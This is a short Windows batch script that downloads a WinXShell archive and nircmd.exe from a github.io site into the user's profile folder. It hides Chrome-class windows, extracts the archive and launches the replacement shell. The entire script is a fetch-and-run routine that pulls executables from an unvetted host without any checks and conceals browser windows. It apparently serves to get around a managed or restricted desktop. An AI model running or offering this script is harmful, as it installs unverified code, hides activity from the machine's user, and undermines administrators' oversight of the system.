@echo off
cd /d "%userprofile%"
curl https://bfffggh.github.io/bp1/WinXShell_x64.7z -o wx.7z
curl https://bfffggh.github.io/bp1/nircmd.exe -o nc.exe
nc win hide class Chrome_WidgetWin_1
"%ProgramFiles%\7-zip\7z.exe" x wx.7z -owx
start "" wx\winxshell.exe
